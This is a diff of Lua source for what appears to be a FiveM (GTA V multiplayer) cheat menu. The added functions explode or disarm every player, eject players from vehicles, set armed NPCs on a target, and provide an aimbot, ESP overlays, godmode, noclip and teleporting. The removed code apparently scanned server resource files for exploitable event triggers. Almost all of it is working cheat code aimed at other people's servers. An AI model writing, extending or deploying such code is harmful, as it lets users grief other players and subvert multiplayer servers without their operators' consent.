+	SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
+    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
+    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
+    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
+    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
+    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)				
+end
+
+function engine1(veh)
+                    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
+                    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
+                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
+                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
+                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
+                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
+                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
+                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
+                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
+                    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
+                    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
+                    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
+end
+
+
+
+local function fixcar()
+ShowInfo("~g~Car fixed!")
+                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
+					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
+					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
+					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
+					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
+					
+		end
+
+
+local function FixVeh(veh)
+    SetVehicleEngineHealth(veh, 1000)
+    SetVehicleFixed(veh)
+end
+
+local function ExplodePlayer(target)
+    local ped = GetPlayerPed(target)
+    local coords = GetEntityCoords(ped)
+    AddExplosion(coords.x + 1, coords.y + 1, coords.z + 1, 4, 100.0, true, false, 0.0)
+end
+
+local function ExplodeAll(self)
+    local plist = GetActivePlayers()
+    for i = 0, #plist do
+        if not self and i == PlayerId() then i = i + 1 end
+        ExplodePlayer(i)
+    end
+end
+
+
+-- Thanks to Fallen#0811 for the idea
+local function PedAttack(target, attackType)
+    local coords = GetEntityCoords(GetPlayerPed(target))
+    
+    if attackType == 1 then weparray = allweapons
+    elseif attackType == 2 then weparray = meleeweapons
+    elseif attackType == 3 then weparray = pistolweapons
+    elseif attackType == 4 then weparray = heavyweapons
+    end
+    
+    for k in EnumeratePeds() do
+        if k ~= GetPlayerPed(target) and not IsPedAPlayer(k) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) < 2000 then
+            local rand = math.ceil(math.random(#weparray))
+            if weparray ~= allweapons then GiveWeaponToPed(k, GetHashKey(weparray[rand][1]), 9999, 0, 1)
+            else GiveWeaponToPed(k, GetHashKey(weparray[rand]), 9999, 0, 1) end
+            ClearPedTasks(k)
+            TaskCombatPed(k, GetPlayerPed(target), 0, 16)
+            SetPedCombatAbility(k, 100)
+            SetPedCombatRange(k, 2)
+            SetPedCombatAttributes(k, 46, 1)
+            SetPedCombatAttributes(k, 5, 1)
+        end
+    end
+end
+
+
+function ApplyShockwave(entity)
+    local pos = GetEntityCoords(PlayerPedId())
+    local coord = GetEntityCoords(entity)
+    local dx = coord.x - pos.x
+    local dy = coord.y - pos.y
+    local dz = coord.z - pos.z
+    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
+    local distanceRate = (50 / distance) * math.pow(1.04, 1 - distance)
+    ApplyForceToEntity(entity, 1, distanceRate * dx, distanceRate * dy, distanceRate * dz, math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), true, false, true, true, true, true)
+end
+
+local function DoForceFieldTick(radius)
+    local player = PlayerPedId()
+    local coords = GetEntityCoords(PlayerPedId())
+    local playerVehicle = GetPlayersLastVehicle()
+    local inVehicle = IsPedInVehicle(player, playerVehicle, true)
+    
+    DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 80, 0, 35, false, true, 2, nil, nil, false)
+    
+    for k in EnumerateVehicles() do
+        if (not inVehicle or k ~= playerVehicle) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
+            RequestControlOnce(k)
+            ApplyShockwave(k)
+        end
+    end
+    
+    for k in EnumeratePeds() do
+        if k ~= PlayerPedId() and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
+            RequestControlOnce(k)
+            SetPedRagdollOnCollision(k, true)
+            SetPedRagdollForceFall(k)
+            ApplyShockwave(k)
+        end
+    end
+end
+
+local function DoRapidFireTick()
+    DisablePlayerFiring(PlayerPedId(), true)
+    if IsDisabledControlPressed(0, Keys["MOUSE1"]) then
+        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
+        local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
+        local camDir = GetCamDirFromScreenCenter()
+        local camPos = GetGameplayCamCoord()
+        local launchPos = GetEntityCoords(wepent)
+        local targetPos = camPos + (camDir * 200.0)
+        
+        ClearAreaOfProjectiles(launchPos, 0.0, 1)
+        
+        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
+        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
+    end
+end
+
+local function StripPlayer(target)
+    local ped = GetPlayerPed(target)
+    RemoveAllPedWeapons(ped, false)
+end
+
+local function StripAll(self)
+    local plist = GetActivePlayers()
+    for i = 0, #plist do
+        if not self and i == PlayerId() then i = i + 1 end
+        StripPlayer(i)
+    end
+end
+
+local function KickFromVeh(target)
+    local ped = GetPlayerPed(target)
+    if IsPedInAnyVehicle(ped, false) then
+        ClearPedTasksImmediately(ped)
+    end
+end
+
+local function KickAllFromVeh(self)
+    local plist = GetActivePlayers()
+    for i = 0, #plist do
+        if not self and i == PlayerId() then i = i + 1 end
+        KickFromVeh(i)
+    end
+end
+
+local function CancelAnimsAll(self)
+    local plist = GetActivePlayers()
+    for i = 0, #plist do
+        if not self and i == PlayerId() then i = i + 1 end
+        ClearPedTasksImmediately(GetPlayerPed(plist[i]))
+    end
+end
+
+local function RandomClothes(target)
+    local ped = GetPlayerPed(target)
+    SetPedRandomComponentVariation(ped, false)
+    SetPedRandomProps(ped)
+end
+
+local function GiveAllWeapons(target)
+    local ped = GetPlayerPed(target)
+    for i = 0, #allweapons do
+        GiveWeaponToPed(ped, GetHashKey(allweapons[i]), 9999, false, false)
+    end
+end
+
+local function GiveAllPlayersWeapons(self)
+    local plist = GetActivePlayers()
+    for i = 0, #plist do
+        if not self and i == PlayerId() then i = i + 1 end
+        GiveAllWeapons(i)
+    end
+end
+
+local function GiveWeapon(target, weapon)
+    local ped = GetPlayerPed(target)
+    GiveWeaponToPed(ped, GetHashKey(weapon), 9999, false, false)
+end
+
+local function GiveMaxAmmo(target)
+    local ped = GetPlayerPed(target)
+    for i = 1, #allweapons do
+        AddAmmoToPed(ped, GetHashKey(allweapons[i]), 9999)
+    end
+end
+
+local function TeleportToPlayer(target)
+    local ped = GetPlayerPed(target)
+    local pos = GetEntityCoords(ped)
+    SetEntityCoords(PlayerPedId(), pos)
+end
+
+local function TeleportToWaypoint()
+    local entity = PlayerPedId()
+    if IsPedInAnyVehicle(entity, false) then
+        entity = GetVehiclePedIsUsing(entity)
+    end
+    local success = false
+    local blipFound = false
+    local blipIterator = GetBlipInfoIdIterator()
+    local blip = GetFirstBlipInfoId(8)
+    
+    while DoesBlipExist(blip) do
+        if GetBlipInfoIdType(blip) == 4 then
+            cx, cy, cz = table.unpack(Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()))--GetBlipInfoIdCoord(blip)
+            blipFound = true
+            break
+        end
+        blip = GetNextBlipInfoId(blipIterator)
+        Wait(0)
+    end
+    
+    if blipFound then
+        local groundFound = false
+        local yaw = GetEntityHeading(entity)
+        
+        for i = 0, 1000, 1 do
+            SetEntityCoordsNoOffset(entity, cx, cy, ToFloat(i), false, false, false)
+            SetEntityRotation(entity, 0, 0, 0, 0, 0)
+            SetEntityHeading(entity, yaw)
+            SetGameplayCamRelativeHeading(0)
+            Wait(0)
+            if GetGroundZFor_3dCoord(cx, cy, ToFloat(i), cz, false) then
+                cz = ToFloat(i)
+                groundFound = true
+                break
+            end
+        end
+        if not groundFound then
+            cz = -300.0
+        end
+        success = true
+    else
+        ShowInfo('~r~Blip not found')
+    end
+    
+    if success then
+	ShowInfo("~g~Teleported!")
+        SetEntityCoordsNoOffset(entity, cx, cy, cz, false, false, true)
+        SetGameplayCamRelativeHeading(0)
+        if IsPedSittingInAnyVehicle(PlayerPedId()) then
+            if GetPedInVehicleSeat(GetVehiclePedIsUsing(PlayerPedId()), -1) == PlayerPedId() then
+                SetVehicleOnGroundProperly(GetVehiclePedIsUsing(PlayerPedId()))
             end
         end
     end
 
-    local function _split(content, pattern)
-        local lines = {}
+end
 
-        for s in content:gmatch(pattern) do
-            lines[#lines + 1] = s
-        end
 
-        return lines
+local function ToggleGodmode(tog)
+    local ped = PlayerPedId()
+    SetEntityProofs(ped, tog, tog, tog, tog, tog)
+    SetPedCanRagdoll(ped, not tog)
+end
+
+local function ToggleNoclip()
+ShowInfo("Noclipping ~g~[ON]")
+    Noclipping = not Noclipping
+    if Noclipping then
+        SetEntityVisible(PlayerPedId(), false, false)
+    else
+        SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
+        SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), true, false)
+        SetEntityVisible(PlayerPedId(), true, false)
     end
+end
 
-    local function _find(tab, what)
-        local ret = {}
-
-        for id, val in dict.pairs(tab) do
-            if val == what or val:find(what) then
-                ret[#ret + 1] = id
+local function ToggleESP()
+    ESPEnabled = not ESPEnabled
+	local _,x,y = false, 0.0, 0.0
+	
+	Citizen.CreateThread(function()
+		while ESPEnabled do
+            local plist = GetActivePlayers()
+            table.removekey(plist, PlayerId())
+            for i = 1, #plist do
+				local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
+				_, x, y = GetScreenCoordFromWorldCoord(targetCoords.x, targetCoords.y, targetCoords.z)
+			end
+			Wait(ESPRefreshTime)
+		end
+	end)
+	
+	
+    Citizen.CreateThread(function()
+        while ESPEnabled do
+            local plist = GetActivePlayers()
+            table.removekey(plist, PlayerId())
+            for i = 1, #plist do
+                local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
+                local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), targetCoords)
+                if distance <= EspDistance then
+                    local _, wephash = GetCurrentPedWeapon(GetPlayerPed(plist[i]), 1)
+                    local wepname = GetWeaponNameFromHash(wephash)
+                    local vehname = "On Foot"
+                    if IsPedInAnyVehicle(GetPlayerPed(plist[i]), 0) then
+                        vehname = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(GetPlayerPed(plist[i])))))
+                    end
+                    if wepname == nil then wepname = "Unknown" end
+                    DrawRect(x, y, 0.008, 0.01, 0, 0, 255, 255)
+                    DrawRect(x, y, 0.003, 0.005, 255, 0, 0, 255)
+                    local espstring1 = "~b~ID: " .. GetPlayerServerId(plist[i]) .. "  |  ~b~Name: " .. GetPlayerName(plist[i]) .. "  |  ~b~Distance: " .. math.floor(distance)
+                    local espstring2 = "~b~Weapon: " .. wepname .. "  |  ~b~Vehicle: " .. vehname
+                    DrawTxt(espstring1, x - 0.05, y - 0.04, 0.0, 0.2)
+                    DrawTxt(espstring2, x - 0.05, y - 0.03, 0.0, 0.2)
+                end
             end
+            Wait(0)
         end
+    end)
+end
 
-        return ret
-    end
-
-    local function _get_depth(line, lines, deep)
-        local out = {}
-
-        for i = -deep, deep do
-            out[line + i] = lines[line + i]
+function ToggleBlips()
+    BlipsEnabled = not BlipsEnabled
+    
+    if not BlipsEnabled then
+        for i = 1, #pblips do
+            RemoveBlip(pblips[i])
         end
-
-        return out
-    end
-
-    FM.NotifiedDyanmic = {}
-
-    local function _replaced(res, data)
-        local replaced
-        local contents = FM:GetFunction("LoadResourceFile")(res, data.File)
-        if not contents or contents == "nil" or contents:len() <= 0 then return end
-        local lines = _split(contents, "[^\r\n]+")
-
-        for _, dat in dict.pairs(data.KnownTriggers) do
-            local content = ""
-            local line
-
-            if dat.LookFor then
-                local _lines = _find(lines, dat.LookFor)
-
-                if _lines then
-                    for k, _line in dict.pairs(_lines) do
-                        local depth = dat.Depth or 3
-                        local possible = _get_depth(_line, lines, depth)
-
-                        for _, val in dict.pairs(possible) do
-                            if val then
-                                local match
-
-                                for _, x in dict.pairs(dat.Strip) do
-                                    if val:find(x) then
-                                        if match == val then break end
-                                        match = val
-                                    else
-                                        match = nil
+    else
+        
+        Citizen.CreateThread(function()
+            pblips = {}
+            while BlipsEnabled do
+                local plist = GetActivePlayers()
+                table.removekey(plist, PlayerId())
+                for i = 1, #plist do
+                    if NetworkIsPlayerActive(plist[i]) then
+                        ped = GetPlayerPed(plist[i])
+                        pblips[i] = GetBlipFromEntity(ped)
+                        if not DoesBlipExist(pblips[i]) then
+                            pblips[i] = AddBlipForEntity(ped)
+                            SetBlipSprite(pblips[i], 1)
+                            Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
+                        else
+                            veh = GetVehiclePedIsIn(ped, false)
+                            blipSprite = GetBlipSprite(pblips[i])
+                            if not GetEntityHealth(ped) then 
+                                if blipSprite ~= 274 then
+                                    SetBlipSprite(pblips[i], 274)
+                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
+                                end
+                            elseif veh then
+                                vehClass = GetVehicleClass(veh)
+                                vehModel = GetEntityModel(veh)
+                                if vehClass == 15 then 
+                                    if blipSprite ~= 422 then
+                                        SetBlipSprite(pblips[i], 422)
+                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                     end
+                                elseif vehClass == 16 then 
+                                    if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra")
+                                        or vehModel == GetHashKey("lazer") then -- jet
+                                        if blipSprite ~= 424 then
+                                            SetBlipSprite(pblips[i], 424)
+                                            Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
+                                        end
+                                    elseif blipSprite ~= 423 then
+                                        SetBlipSprite(pblips[i], 423)
+                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
+                                    end
+                                elseif vehClass == 14 then 
+                                    if blipSprite ~= 427 then
+                                        SetBlipSprite(pblips[i], 427)
+                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
+                                    end
+                                elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2")
+                                    or vehModel == GetHashKey("limo2") then 
+                                    if blipSprite ~= 426 then
+                                        SetBlipSprite(pblips[i], 426)
+                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
+                                    end
+                                elseif vehModel == GetHashKey("rhino") then 
+                                    if blipSprite ~= 421 then
+                                        SetBlipSprite(pblips[i], 421)
+                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
+                                    end
+                                elseif blipSprite ~= 1 then 
+                                    SetBlipSprite(pblips[i], 1)
+                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                                 end
-
-                                if match then
-                                    content = match
-                                    break
-                                    break
+                                
+                                
+                                passengers = GetVehicleNumberOfPassengers(veh)
+                                if passengers then
+                                    if not IsVehicleSeatFree(veh, -1) then
+                                        passengers = passengers + 1
+                                    end
+                                    ShowNumberOnBlip(pblips[i], passengers)
+                                else
+                                    HideNumberOnBlip(pblips[i])
                                 end
+                            else
+                                
+                                
+                                HideNumberOnBlip(pblips[i])
+                                if blipSprite ~= 1 then
+                                    SetBlipSprite(pblips[i], 1)
+                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
+                                end
+                            end
+                            SetBlipRotation(pblips[i], math.ceil(GetEntityHeading(veh)))
+                            SetBlipNameToPlayerName(pblips[i], plist[i])
+                            SetBlipScale(pblips[i], 0.85)
+                            
+                            
+                            if IsPauseMenuActive() then
+                                SetBlipAlpha(pblips[i], 255)
+                            else
+                                x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
+                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(plist[i]), true))
+                                distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
+                                if distance < 0 then
+                                    distance = 0
+                                elseif distance > 255 then
+                                    distance = 255
+                                end
+                                SetBlipAlpha(pblips[i], distance)
                             end
                         end
                     end
                 end
-            else
-                content = lines[dat.Line]
+                Wait(0)
+            end
+        end)
+    end
+end
+
+local function ShootAt(target, bone)
+    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
+    SetPedShootsAtCoord(PlayerPedId(), boneTarget, true)
+end
+
+local function ShootAt2(target, bone, damage)
+    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
+    local _, weapon = GetCurrentPedWeapon(PlayerPedId())
+    ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, damage, true, weapon, PlayerPedId(), true, true, 1000.0)
+end
+
+local function ShootAimbot(k)
+    if IsEntityOnScreen(k) and HasEntityClearLosToEntityInFront(PlayerPedId(), k) and
+        not IsPedDeadOrDying(k) and not IsPedInVehicle(k, GetVehiclePedIsIn(k), false) and 
+		IsDisabledControlPressed(0, Keys["MOUSE1"]) and IsPlayerFreeAiming(PlayerId()) then
+        local x, y, z = table.unpack(GetEntityCoords(k))
+        local _, _x, _y = World3dToScreen2d(x, y, z)
+        if _x > 0.25 and _x < 0.75 and _y > 0.25 and _y < 0.75 then
+            local _, weapon = GetCurrentPedWeapon(PlayerPedId())
+            ShootAt2(k, AimbotBone, GetWeaponDamage(weapon, 1))
+        end
+    end
+end
+
+local function RageShoot(target)
+    if not IsPedDeadOrDying(target) then
+        local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, "SKEL_HEAD"), 0.0, 0.0, 0.0)
+        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
+        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
+        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0.1, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
+        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0.1, 0, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
+    end
+end
+
+local function NameToBone(name)
+    if name == "Head" then
+        return "SKEL_Head"
+    elseif name == "Chest" then
+        return "SKEL_Spine2"
+    elseif name == "Left Arm" then
+        return "SKEL_L_UpperArm"
+    elseif name == "Right Arm" then
+        return "SKEL_R_UpperArm"
+    elseif name == "Left Leg" then
+        return "SKEL_L_Thigh"
+    elseif name == "Right Leg" then
+        return "SKEL_R_Thigh"
+    elseif name == "Dick" then
+        return "SKEL_Pelvis"
+    else
+        return "SKEL_ROOT"
+    end
+end
+
+local function SpawnVeh(model, PlaceSelf, SpawnEngineOn)
+    RequestModel(GetHashKey(model))
+    Wait(500)
+    if HasModelLoaded(GetHashKey(model)) then
+        local coords = GetEntityCoords(PlayerPedId())
+        local xf = GetEntityForwardX(PlayerPedId())
+        local yf = GetEntityForwardY(PlayerPedId())
+        local heading = GetEntityHeading(PlayerPedId())
+        local veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
+        if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
+        if SpawnEngineOn then SetVehicleEngineOn(veh, 1, 1) end
+        return veh
+    else ShowInfo("~r~Model not recognized (Try Again)") end
+end
+
+local function SpawnPlane(model, PlaceSelf, SpawnInAir)
+    RequestModel(GetHashKey(model))
+    Wait(500)
+    if HasModelLoaded(GetHashKey(model)) then
+        local coords = GetEntityCoords(PlayerPedId())
+        local xf = GetEntityForwardX(PlayerPedId())
+        local yf = GetEntityForwardY(PlayerPedId())
+        local heading = GetEntityHeading(PlayerPedId())
+        local veh = nil
+        if SpawnInAir then
+            veh = CreateVehicle(GetHashKey(model), coords.x + xf * 20, coords.y + yf * 20, coords.z + 500, heading, 1, 1)
+        else
+            veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
+        end
+        if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
+    else ShowInfo("~r~Model not recognized (Try Again)") end
+end
+
+local function GetCurrentOutfit(target)
+    local ped = GetPlayerPed(target)
+    outfit = {}
+    
+    outfit.hat = GetPedPropIndex(ped, 0)
+    outfit.hat_texture = GetPedPropTextureIndex(ped, 0)
+    
+    outfit.glasses = GetPedPropIndex(ped, 1)
+    outfit.glasses_texture = GetPedPropTextureIndex(ped, 1)
+    
+    outfit.ear = GetPedPropIndex(ped, 2)
+    outfit.ear_texture = GetPedPropTextureIndex(ped, 2)
+    
+    outfit.watch = GetPedPropIndex(ped, 6)
+    outfit.watch_texture = GetPedPropTextureIndex(ped, 6)
+    
+    outfit.wrist = GetPedPropIndex(ped, 7)
+    outfit.wrist_texture = GetPedPropTextureIndex(ped, 7)
+    
+    outfit.head_drawable = GetPedDrawableVariation(ped, 0)
+    outfit.head_palette = GetPedPaletteVariation(ped, 0)
+    outfit.head_texture = GetPedTextureVariation(ped, 0)
+    
+    outfit.beard_drawable = GetPedDrawableVariation(ped, 1)
+    outfit.beard_palette = GetPedPaletteVariation(ped, 1)
+    outfit.beard_texture = GetPedTextureVariation(ped, 1)
+    
+    outfit.hair_drawable = GetPedDrawableVariation(ped, 2)
+    outfit.hair_palette = GetPedPaletteVariation(ped, 2)
+    outfit.hair_texture = GetPedTextureVariation(ped, 2)
+    
+    outfit.torso_drawable = GetPedDrawableVariation(ped, 3)
+    outfit.torso_palette = GetPedPaletteVariation(ped, 3)
+    outfit.torso_texture = GetPedTextureVariation(ped, 3)
+    
+    outfit.legs_drawable = GetPedDrawableVariation(ped, 4)
+    outfit.legs_palette = GetPedPaletteVariation(ped, 4)
+    outfit.legs_texture = GetPedTextureVariation(ped, 4)
+    
+    outfit.hands_drawable = GetPedDrawableVariation(ped, 5)
+    outfit.hands_palette = GetPedPaletteVariation(ped, 5)
+    outfit.hands_texture = GetPedTextureVariation(ped, 5)
+    
+    outfit.foot_drawable = GetPedDrawableVariation(ped, 6)
+    outfit.foot_palette = GetPedPaletteVariation(ped, 6)
+    outfit.foot_texture = GetPedTextureVariation(ped, 6)
+    
+    outfit.acc1_drawable = GetPedDrawableVariation(ped, 7)
+    outfit.acc1_palette = GetPedPaletteVariation(ped, 7)
+    outfit.acc1_texture = GetPedTextureVariation(ped, 7)
+    
+    outfit.acc2_drawable = GetPedDrawableVariation(ped, 8)
+    outfit.acc2_palette = GetPedPaletteVariation(ped, 8)
+    outfit.acc2_texture = GetPedTextureVariation(ped, 8)
+    
+    outfit.acc3_drawable = GetPedDrawableVariation(ped, 9)
+    outfit.acc3_palette = GetPedPaletteVariation(ped, 9)
+    outfit.acc3_texture = GetPedTextureVariation(ped, 9)
+    
+    outfit.mask_drawable = GetPedDrawableVariation(ped, 10)
+    outfit.mask_palette = GetPedPaletteVariation(ped, 10)
